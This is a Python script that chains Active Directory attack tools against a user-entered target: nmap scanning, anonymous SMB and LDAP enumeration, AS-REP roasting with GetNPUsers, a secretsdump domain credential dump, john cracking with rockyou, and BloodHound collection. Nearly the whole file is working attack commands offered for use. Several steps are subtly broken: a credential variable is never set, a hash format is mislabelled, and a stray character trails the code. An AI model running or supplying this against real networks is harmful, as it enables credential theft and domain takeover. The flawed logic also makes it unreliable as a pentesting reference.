#!/usr/bin/env python3
import os
import subprocess
import re

# ANSI Colours for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# User-defined target and domain
TARGET = input("Enter target IP or domain controller: ")
DOMAIN = input("Enter domain name (if known): ")

# Credential storage
creds = None
users_file = "users.txt"

# Run a command and return output
def run_cmd(cmd):
    print(f"{YELLOW}[*] Running: {cmd}{RESET}")
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
        print(f"{GREEN}{result}{RESET}")
        return result
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        return ""

# Step 1: Run Nmap scan for relevant ports
print(f"{YELLOW}[*] Scanning {TARGET} for AD-related services...{RESET}")
nmap_result = run_cmd(f"nmap -p 88,389,445,636,5985,5986,53,3389,1433 -sC -sV --script 'ldap*,smb*,krb5*,ms-sql*' -oN scan_results.txt {TARGET}")

# Step 2: Parse Nmap output to determine available services
services = {
    "SMB": re.search(r"445/tcp\s+open", nmap_result),
    "LDAP": re.search(r"389/tcp\s+open", nmap_result),
    "Kerberos": re.search(r"88/tcp\s+open", nmap_result),
    "WinRM": re.search(r"5985/tcp\s+open", nmap_result),
    "MSSQL": re.search(r"1433/tcp\s+open", nmap_result),
}

# Step 3: Run SMB Enumeration if port 445 is open
if services["SMB"]:
    print(f"{GREEN}[+] SMB detected! Enumerating...{RESET}")
    run_cmd(f"crackmapexec smb {TARGET} -u '' -p '' --shares --users --pass-pol > smb_enum.txt")
    
    # Extract usernames
    with open("smb_enum.txt", "r") as f:
        usernames = re.findall(r"(?<=User: )[\w.-]+", f.read())
        if usernames:
            with open(users_file, "w") as u_file:
                u_file.write("\n".join(usernames))
            print(f"{GREEN}[+] Users saved to {users_file}{RESET}")

# Step 4: Run Kerberos Enumeration if port 88 is open
if services["Kerberos"]:
    print(f"{GREEN}[+] Kerberos detected! Enumerating AS-REP roastable users...{RESET}")
    run_cmd(f"python3 GetNPUsers.py {DOMAIN}/ -dc-ip {TARGET} -usersfile {users_file} -outputfile hashes.txt")

# Step 5: Run LDAP Enumeration if port 389 is open
if services["LDAP"]:
    print(f"{GREEN}[+] LDAP detected! Dumping domain info...{RESET}")
    run_cmd(f"python3 ldapdomaindump.py -u '' -p '' -dc-ip {TARGET}")

# Step 6: Try authenticated enumeration if credentials are found
if os.path.exists("hashes.txt"):
    print(f"{GREEN}[+] Hashes found! Attempting pass-the-hash and dumping credentials...{RESET}")
    run_cmd(f"secretsdump.py {DOMAIN}/'':''@{TARGET} -just-dc")

    # Crack NTLM hashes
    print(f"{YELLOW}[*] Cracking NTLM hashes...{RESET}")
    run_cmd(f"john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt")

# Step 7: Run BloodHound if credentials exist
if creds:
    print(f"{GREEN}[+] Running BloodHound to map AD attack paths...{RESET}")
    run_cmd(f"bloodhound-python -u {creds[0]} -p {creds[1]} -d {DOMAIN} -c all --zip")

print(f"{GREEN}[✔] Enumeration completed! Check output files.{RESET}")
o
